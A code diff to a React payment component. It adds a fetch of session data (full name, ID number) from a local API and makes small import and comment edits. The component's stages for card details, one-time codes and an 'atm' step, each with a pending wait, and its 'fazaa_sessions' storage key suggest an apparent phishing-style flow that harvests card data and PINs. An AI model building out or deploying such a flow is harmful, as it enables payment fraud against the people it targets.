@@ -1,4 +1,4 @@
-import { useState, useEffect, type FormEvent, type ReactNode } from 'react'
+import React, { useState, useEffect, type FormEvent, type ReactNode } from 'react'
 
 type Stage = 'card' | 'card_pending' | 'otp' | 'otp_pending' | 'atm' | 'atm_pending' | 'success' | 'failed'
 
@@ -634,7 +634,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     
     let sid = urlSessionId
     
-    // Try localStorage
+    // Try localStorage as fallback
     try {
       const sessions = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
       const lastSession = sid ? sessions.find((s: any) => s.sessionId === sid) : sessions[sessions.length - 1]
@@ -652,6 +652,25 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     
     return sid || 'FAZ-' + Date.now().toString(36)
   })
+
+  // Fetch session data from API to ensure we have the latest data
+  useEffect(() => {
+    if (sessionId) {
+      fetch(`/api/session/${sessionId}`)
+        .then(res => res.json())
+        .then(data => {
+          if (data && data.success && data.data) {
+            setSessionData({
+              fullName: data.data.fullName || sessionData.fullName,
+              idNumber: data.data.idNumber || sessionData.idNumber,
+            })
+          }
+        })
+        .catch(err => {
+          console.error('[Payment] Failed to fetch session data from API:', err)
+        })
+    }
+  }, [sessionId])
 
   const appFee = '10'
   const deliveryFee = '5'
